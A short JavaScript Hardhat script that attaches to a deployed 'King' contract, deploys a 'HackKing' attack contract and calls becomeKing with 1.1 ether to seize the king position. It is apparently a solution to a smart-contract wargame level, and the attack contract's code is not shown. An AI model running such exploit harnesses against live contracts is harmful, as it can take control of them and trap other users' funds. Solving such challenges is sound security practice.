const main = async () => {
  const kingFactory = await ethers.getContractFactory('King');
  const king = await kingFactory.attach(
    '0x868d6d3b1994eBc280E3Aa8dc412473976278AD3'
  );
  console.log('King attached', king.address);
  const hackKingFactory = await ethers.getContractFactory('HackKing');
  const hackKing = await hackKingFactory.deploy();
  console.log('HackKing deploying started');
  var startTime = performance.now();
  await hackKing.deployed();
  var endTime = performance.now();
  console.log(
    'HackKing deployed at %s in %s seconds',
    hackKing.address,
    ((endTime - startTime) / 1000).toFixed(2)
  );
  let txn = await hackKing.becomeKing(king.address, {
    value: ethers.utils.parseEther('1.1'),
    gasLimit: 250000,
  });
  await txn.wait();
  console.log('First transaction: \n', txn);
  txn = await king._king();
  console.log(txn);
};

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (e) {
    console.log(e);
    process.exit(1);
  }
};
runMain();
